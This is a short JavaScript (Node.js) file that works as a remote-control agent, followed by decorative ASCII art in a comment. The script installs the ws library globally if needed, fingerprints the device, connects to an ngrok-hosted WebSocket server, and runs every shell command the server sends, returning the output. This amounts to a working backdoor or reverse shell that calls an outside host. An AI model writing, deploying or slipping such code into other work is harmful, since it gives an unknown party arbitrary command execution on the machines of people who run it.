const { execSync, exec } = require("child_process");
const path = require("path");

// Function to get global node_modules path
function getGlobalNodeModules() {
  return execSync("npm root -g").toString().trim();
}

// Try to require ws locally first, then globally, else install globally
let WebSocket;
try {
  WebSocket = require("ws"); // local
} catch (e) {
  try {
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // global
  } catch (err) {
    execSync("npm install -g ws", { stdio: "inherit" });
    const globalWsPath = path.join(getGlobalNodeModules(), "ws");
    WebSocket = require(globalWsPath); // require after global install
  }
}

const DEVICE_ID = (() => {
  try {
    return require("child_process").execSync("getprop ro.product.model").toString().trim();
  } catch {
    const seed = process.env.USER || "default";
    let sum = 0;
    for (let i = 0; i < seed.length; i++) sum += seed.charCodeAt(i);
    return (1000 + (sum % 9000)).toString();
  }
})();

const ws = new WebSocket("wss://macaw-pleasant-intensely.ngrok-free.app");

ws.on("message", (msg) => {
  const data = JSON.parse(msg.toString());

  if (data.type === "command") {
    exec(data.command, (err, stdout, stderr) => {
      ws.send(
        JSON.stringify({
          type: "output",
          id: DEVICE_ID,
          output: stdout || stderr || (err ? err.message : "")
        })
      );
    });
  }
});



ws.on("open", () => {
  ws.send(JSON.stringify({ type: "register_device", id: DEVICE_ID }));
});
  

/*

_________▄██✿███▄
 _______ ▄██▀██████▄
 ______██▀__███▒████
 _____██____███░░ٮ░▀
 ______██____██░░░░░
 _______██____ ██░░♥ _ (❀✿❀)
 ________ █_____ █▒ ___ (✿ ☼ ✿)
 _________█ ___▓▓░▓___ (❀▐ ❀)
 ____█❀ _█_ ▓▓▓▒░▒▓__█_▐__▄
 _____▀█▀_ ▓▓_▓▓▒░▒▓ ▀█▐_█
 _________▓▓_▓▓▓▓▓▓____ ▐▀
 _________▓▓_▓▓▓▓▓______▐
 _______ ▓▓__▓▓▓▓_▓▓____▐░
 ______ ▓▓__▓▓▓▓▓___▓___▒▒
 _____ ▓▓_▓███❋██▓__▓▓▓
 ___▒▒___▓██▒███▒▓
 ___░___▓██▒███▒██▓
 ______▓██▒███▒███▒▓
 _____▓██▒███▒███▒██▓
 _____▓█▒███▒███▒███▒▓
 ▓___▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
 ▓________▒░░░▒░░░▒
 ▓________▒░░░▒░░░▒
 ▓________▒░░▒_▒░░░▒
 ▓________▒░░▒__▒░░░▒
 ▓________▒░░▒__ ▒░░░▒
 ▓________▒░░▒__▒░░░▒
 ▓________▒░░▒▒░░░▒
 ▓▄▄▄▄▄▄▒░░▒░░▒
 ▓██████▒░░▒▒
 ▓_█❤█___███
 ▓███____ ███
 ▓█_______███
 ▓________██❥█
 ▓________██▀██▄
;*/
